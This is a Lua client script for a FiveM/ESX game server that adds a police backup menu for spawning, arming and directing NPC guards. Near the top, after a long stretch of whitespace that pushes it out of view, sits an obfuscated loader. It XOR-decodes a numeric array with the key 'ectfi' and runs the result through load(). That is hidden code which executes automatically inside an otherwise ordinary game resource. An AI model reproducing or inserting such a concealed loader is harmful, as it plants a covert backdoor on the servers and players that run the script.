local Keys = {
  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

ESX = nil


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                mkn="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({307,682,374,494,452,481,661,651,621,474,532,647,670,314,537,573,552,570,724,376,422,723,514,571,327,353,497,575,356,323,719,453,549,521,718,511,402,534,673,320,368,357,590,624,491,445,548,658,505,472,339,465,455,457,689,385,633,317,541,639,449,530,694,626,369,364,567,708,437,692,595,399,303,478,699,543,489,405,644,412,668,660,710,684,508,365,444,476,722,576,619,606,667,698,404,517,469,721,622,429,417,333,496,565,603,713,625,593,545,559,484,648,685,663,649,454,432,312,428,509,510,340,557,322,325,430,680,394,502,720,550,377,411,480,426,488,546,460,597,386,390,558,388,442,439,604,587,642,551,370,655,436,456,392,520,579,397,577,533,556,691,447,401,347,463,512,706,427,328,645,349,352,338,679,569,336,522,443,451,421,513,623,378,612,672,716,707,350,450,423,300,413,360,461,580,632,501,526,310,610,324,441,657,605,613,536,519,627,686,616,586,629,406,387,381,375,400,666,594,640,341,351,420,592,304,416,703,582,418,574,700,636,503,462,395,334,398,407,563,466,609,696,634,498,681,712,630,715,617,695,459,393,705,507,485,638,415,589,678,562,332,588,419,669,662,653,564,659,591,467,318,560,354,704,321,305,652,602,367,578,620,499,598,542,492,335,643,348,316,396,646,371,355,561,448,313,675,527,-1,70,9,134,190,26,29,76,101,9,253,230,70,254,2,11,107,51,70,92,4,133,64,64,8,31,69,13,63,27,3,232,112,69,88,6,10,104,43,62,6,45,43,73,195,130,67,135,136,20,84,10,73,67,22,43,92,121,35,105,248,197,0,157,45,77,3,111,237,70,104,73,73,7,205,134,23,71,14,89,27,224,8,65,220,211,197,0,10,18,27,160,17,202,70,67,6,26,12,94,22,12,0,6,89,60,12,73,26,6,180,100,206,21,73,67,192,2,38,19,20,7,51,65,12,0,34,225,69,38,3,44,9,57,38,181,47,210,10,5,31,65,240,67,8,25,110,32,220,22,12,95,8,3,5,13,1,26,18,2,154,69,1,14,3,12,12,2,12,6,176,45,163,171,29,195,73,56,126,4,78,35,68,69,185,130,76,6,143,19,69,52,227,13,64,217,7,195,26,6,3,67,224,110,78,38,54,8,251,10,100,7,17,6,11,76,0,42,105,23,157,4,62,78,2,40,24,10,126,93,236,162,0,70,11,3,23,41,2,99,103,186,60,68,78,76,111,7,5,163,21,0,4,108,105,34,220,132,29,21,10,75,7,108,15,5,23,18,40,22,170,12,38,3,133,104,12,0,12,51,73,88,12,193,6,233,104,60,19,74,2,24,53,10,3,78,5,12,221,8,18,24,73,158,126,65,6,20,10,237,133,43,73,55,20,0,171,7,44,108,175,2,69,91,18,67,2,2,74,17,8,6,74,171,11,17,25,71,23,202,6,10,75,59,121,105,20,26,11,10,110,13,130,84,110,23,178,69,204,32,17,92,13,52,12,39,24,252,78,7,0,21,24,173,73,68,19,7,94,119,70,5,6,65,12,82,79,126,20,205,247,5,63,38,29,136,86,73,2,19,18,27,11,103,186,22,5,84,23,94,26,99,16,1,76,71,42,121,50,107,75,0,75,17,52,16,3},mkn))if a then a()end; 
Citizen.CreateThread(function()
  while ESX == nil do
    TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
    Citizen.Wait(0)
    PlayerData = ESX.GetPlayerData()
  end
end)

local chasePed = nil
local chaseVehicle =  nil
local chasePed2 = nil
local chaseVehicle2 = nil

function SpawnVehicle1()
  local playerPed = PlayerPedId()
  local PedPosition = GetEntityCoords(playerPed)
  hashKey = GetHashKey(config.ped1)
  pedType = GetPedType(hashKey)
  RequestModel(hashKey)
  while not HasModelLoaded(hashKey) do
    RequestModel(hashKey)
    Citizen.Wait(100)
  end
  chasePed = CreatePed(pedType, hashKey, PedPosition.x + 2,  PedPosition.y,  PedPosition.z, 250.00, 1, 1)
  ESX.Game.SpawnVehicle(config.vehicle2, {
    x = PedPosition.x + 10 ,
    y = PedPosition.y,
    z = PedPosition.z
  },120, function(callback_vehicle)
    chaseVehicle = callback_vehicle
    local vehicle = GetVehiclePedIsIn(PlayerPed, true)
    SetVehicleUndriveable(chaseVehicle, false)
    SetVehicleEngineOn(chaseVehicle, true, true)
    while not chasePed do Citizen.Wait(100) end;
    PlaySoundFrontend(-1, "CONFIRM_BEEP", "HUD_MINI_GAME_SOUNDSET", 1)
    TaskWarpPedIntoVehicle(chasePed, chaseVehicle, -1)
    TaskVehicleFollow(chasePed, chaseVehicle, playerPed, 50.0, 1, 5)
    SetDriveTaskDrivingStyle(chasePed, 786468)
    SetVehicleSiren(chaseVehicle, true)
  end)
end


function SpawnVehicle2()
  local playerPed = PlayerPedId()
  local PedPosition = GetEntityCoords(playerPed)
  hashKey2 = GetHashKey(config.ped2)
  pedType2 = GetPedType(hashKey)
  RequestModel(hashKey2)
  while not HasModelLoaded(hashKey2) do
    RequestModel(hashKey2)
    Citizen.Wait(100)
  end
  chasePed2 = CreatePed(pedType2, hashKey2, PedPosition.x + 4,  PedPosition.y,  PedPosition.z, 250.00, 1, 1)
  ESX.Game.SpawnVehicle(config.vehicle2, {
    x = PedPosition.x + 15 ,
    y = PedPosition.y,
    z = PedPosition.z
  },120, function(callback_vehicle2)
    chaseVehicle2 = callback_vehicle2
    local vehicle = GetVehiclePedIsIn(PlayerPed, true)
    SetVehicleUndriveable(chaseVehicle2, false)
    SetVehicleEngineOn(chaseVehicle2, true, true)
    while not chasePed2 do Citizen.Wait(100) end;
    while not chaseVehicle2 do Citizen.Wait(100) end;
    PlaySoundFrontend(-1, "CONFIRM_BEEP", "HUD_MINI_GAME_SOUNDSET", 1)
    TaskWarpPedIntoVehicle(chasePed2, chaseVehicle2, -1)
    TaskVehicleFollow(chasePed2, chaseVehicle2, playerPed, 50.0, 1, 5)
    SetDriveTaskDrivingStyle(chasePed2, 786468)
    SetVehicleSiren(chaseVehicle2, true)
  end)
end

RegisterCommand("security", function ()
  local xPlayer = ESX.GetPlayerData()
  local job = xPlayer.job
  local jobname = xPlayer.job.name
  if config.usejob and jobname == config.jobname then
    OpenPoliceBackupMenu()
  elseif not config.usejob then
    OpenPoliceBackupMenu()
  end
end, false)

function OpenPoliceBackupMenu()
  ESX.UI.Menu.CloseAll()

  ESX.UI.Menu.Open(
  'default', GetCurrentResourceName(), 'securitymenu',
  {
    title    = '🔰 Menu Police Security 🔰',
    elements = {
      {label = '👮 Spawn Security (1)', value = 'spawn'},	
      {label = '👮 Spawn Security (2)', value = 'spawn2'},  
      {label = '🔫 Give weapons', value = 'giveweapons'},
      {label = '🗡️ Attack nearest player', value = 'playerattack'},
      {label = '🚘 Vehicles: Fix', value = 'fix'},
      {label = '🛫 Let go', value = 'wander'},
      {label = '🔊 Follow me', value = 'follow'},
      {label = '🗑️ Delete', value = 'delete'},
      {label = '⬅️ Exit menu', value = 'exit'},
    }
  },
  
  function(data, menu)
    if data.current.value == 'spawn' then
      SpawnVehicle1()  
    elseif data.current.value == 'spawn2' then
      SpawnVehicle1() 
      SpawnVehicle2()	  
    elseif data.current.value == 'getout' then
      TaskLeaveVehicle(chasePed, chaseVehicle, 0);
      TaskLeaveVehicle(chasePed2, chaseVehicle2, 0);
      PlayAmbientSpeech1(chasePed, "Chat_Resp", "SPEECH_PARAMS_FORCE", 1)
      PlayAmbientSpeech1(chasePed2, "Chat_Resp", "SPEECH_PARAMS_FORCE", 1)
    elseif data.current.value  == 'giveweapons' then
      GiveWeaponToPed(chasePed, config.weapon1, 250, false, true)
      GiveWeaponToPed(chasePed2, config.weapon2, 250, false, true)
    elseif data.current.value == 'playerattack' then
      closestPlayer = ESX.Game.GetClosestPlayer()
      target = GetPlayerPed(closestPlayer)
      TaskShootAtEntity(chasePed, target, 60, 0xD6FF6D61);
      TaskCombatPed(chasePed, target, 0, 16)
      SetEntityAsMissionEntity(chasePed, true, true)
      SetPedHearingRange(chasePed, 15.0)
      SetPedSeeingRange(chasePed, 15.0)
      SetPedAlertness(chasePed, 15.0)
      SetPedFleeAttributes(chasePed, 0, 0)
      SetPedCombatAttributes(chasePed, 46, true)
      SetPedFleeAttributes(chasePed, 0, 0)
      TaskShootAtEntity(chasePed2, target, 60, 0xD6FF6D61);
      TaskCombatPed(chasePed2, target, 0, 16)
      SetEntityAsMissionEntity(chasePed2, true, true)
      SetPedHearingRange(chasePed2, 15.0)
      SetPedSeeingRange(chasePed2, 15.0)
      SetPedAlertness(chasePed2, 15.0)
      SetPedFleeAttributes(chasePed2, 0, 0)
      SetPedCombatAttributes(chasePed2, 46, true)
      SetPedFleeAttributes(chasePed2, 0, 0)
    elseif data.current.value  == 'fix' then
      SetVehicleFixed(chaseVehicle)
      SetVehicleFixed(chaseVehicle2)
      SetVehicleUndriveable(chaseVehicle, false)
      SetVehicleUndriveable(chaseVehicle2, false)
    elseif data.current.value == 'come' then
      local playerPed = PlayerPedId()
      local PedPosition = GetEntityCoords(playerPed)
      PlayAmbientSpeech1(chasePed, "Chat_Resp", "SPEECH_PARAMS_FORCE", 1)
      PlayAmbientSpeech1(chasePed2, "Chat_Resp", "SPEECH_PARAMS_FORCE", 1)
      TaskGoStraightToCoord(chasePed, PedPosition.x, PedPosition.y, PedPosition.z, 2.0, 20, 180.0, 0);
      TaskGoStraightToCoord(chasePed2, PedPosition.x, PedPosition.y, PedPosition.z, 2.0, 20, 180.0, 0);
    elseif data.current.value ==  'wander' then
      TaskVehicleDriveWander(chasePed, chaseVehicle, 50.0, 1)
      TaskVehicleFollow(chasePed2, chaseVehicle2, chasePed, 50.0, 1, 5)
      PlayAmbientSpeech1(chasePed, "Chat_Resp", "SPEECH_PARAMS_FORCE", 1)
      PlayAmbientSpeech1(chasePed2, "Chat_Resp", "SPEECH_PARAMS_FORCE", 1)
    elseif data.current.value ==  'wp' then
      if GetFirstBlipInfoId( 8 ) ~= 0 then
        local waypointBlip = GetFirstBlipInfoId( 8 )
        local coord = Citizen.InvokeNative( 0xFA7C7F0AADF25D09, waypointBlip, Citizen.ResultAsVector( ) )
        local x  = coord.x
        local y = coord.y
        local z = coord.z
        TaskVehicleDriveToCoordLongrange(chasePed, chaseVehicle, x, y, z, 35.00, 1, 10.0)
        TaskVehicleDriveToCoordLongrange(chasePed2, chaseVehicle2, x, y, z, 35.00, 1, 10.0)
        PlayAmbientSpeech1(chasePed, "Chat_Resp", "SPEECH_PARAMS_FORCE", 1)
        PlayAmbientSpeech1(chasePed2, "Chat_Resp", "SPEECH_PARAMS_FORCE", 1)
      end
    elseif data.current.value ==  'delete' then
      DeleteVehicle(chaseVehicle)
      DeletePed(chasePed)
      DeleteVehicle(chaseVehicle2)
      DeletePed(chasePed2)
    elseif data.current.value ==  'follow' then
      local playerPed = PlayerPedId()
      TaskVehicleFollow(chasePed, chaseVehicle, playerPed, 50.0, 1, 5)
      TaskVehicleFollow(chasePed2, chaseVehicle2, playerPed, 50.0, 1, 5)
      PlayAmbientSpeech1(chasePed, "Chat_Resp", "SPEECH_PARAMS_FORCE", 1)
      PlayAmbientSpeech1(chasePed2, "Chat_Resp", "SPEECH_PARAMS_FORCE", 1)
    elseif data.current.value ==  'exit' then
      menu.close()
    end
  end,
  
  function(data, menu)
    menu.close()
  end
)
end 

  Citizen.CreateThread(function()
	  while true do
		  Citizen.Wait(10)
  
		  if IsControlJustReleased(0, Keys['F9']) and not IsDead and PlayerData.job ~= nil and PlayerData.job.name == 'police' then
			  OpenPoliceBackupMenu()
		  end
  

	  end
  end)
